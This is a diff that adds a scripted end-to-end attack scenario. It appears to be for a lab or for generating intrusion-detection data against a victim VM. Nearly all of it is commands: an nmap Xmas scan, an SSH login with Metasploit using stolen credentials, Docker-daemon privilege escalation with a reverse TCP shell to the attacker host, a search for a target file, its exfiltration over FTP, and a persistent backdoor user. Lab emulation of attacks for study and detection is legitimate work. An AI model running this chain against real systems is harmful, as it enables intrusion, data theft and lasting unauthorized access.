@@ -1,0 +1,58 @@
+#Attack Scenario 2
+
+#----LEGEND----#
+##next command(s) are statemachine commands
+##-m next command(s) are msfconsole internal command
+#@next command is a setup commands that will not affect the attack
+#$output of previous command is a data source for victim model 
+#*output of previous command has a variable for attack management
+#?FYI
+
+#?Overview
+#?RECON - nmap X-Mas Tree Scan
+#?INITIAL INTRUSION - SSH 'Stolen Creds'
+#?DISCOVERY (Target File) - 10_of_clubs.wav
+#?DATA EXFIL - stage/download in ftp server
+#?PERSISTANCE - create new user
+
+#----Just attack commands----#
+#The minimal commands to run end to end attack
+#No descriptions or data sources
+#victim = 10.0.2.9
+#attacker = 10.0.2.8
+##RECON
+nmap -sV -Pn -T5 -sX 10.0.2.9
+#@Part of multiple state
+msfconsole
+##-m RECON
+use auxiliary/scanner/ssh/ssh_version
+set rhosts 10.0.2.9
+run
+##-m INITIAL INTRUSION
+use auxiliary/scanner/ssh/ssh_login
+set rhosts 10.0.2.9
+set username boba_fett
+set password mandalorian1
+run -j
+#*"Command Shell session X opened ..."
+##PRIVILEGE ESCALATION
+use exploit/linux/local/docker_daemon_privilege_escalation
+set payload linux/x86/shell_reverse_tcp 
+set lhost 10.0.2.8
+set lport 1234
+set session X
+exploit -j
+#*"Command Shell session Y opened ..."
+##-m DISCOVERY
+sessions -i Y -c 'groups'
+##-m DISCOVERY
+sessions -i Y -c 'whoami'
+sessions -i Y -c 'find / -name 10_of_clubs.wav 2>&1 | grep -v "Permission denied'
+#*location of 10_of_clubs.wav
+##-m DATA EXFIL
+sessions -i Y -c 'tar -czf 10_of_clubs.wav.tar.gz /home/artoo_detoo/music/10_of_clubs.wav'
+sessions -i Y -c 'mv 10_of_clubs.wav.tar.gz /home/boba_fett/10_of_clubs.wav.tar.gz'
+wget --no-passive --ftp-user=boba_fett --ftp-password=mandalorian1 ftp://10.0.2.9/10_of_clubs.wav.tar.gz 
+##-mPERSISTANCE
+sessions -i Y -c 'useradd -g users -s /bin/bash -p $(echo itsatrap | openssl passwd -1 -stdin) adm_ackbar'
+sessions -i Y -c 'usermod -a -G docker adm_ackbar'
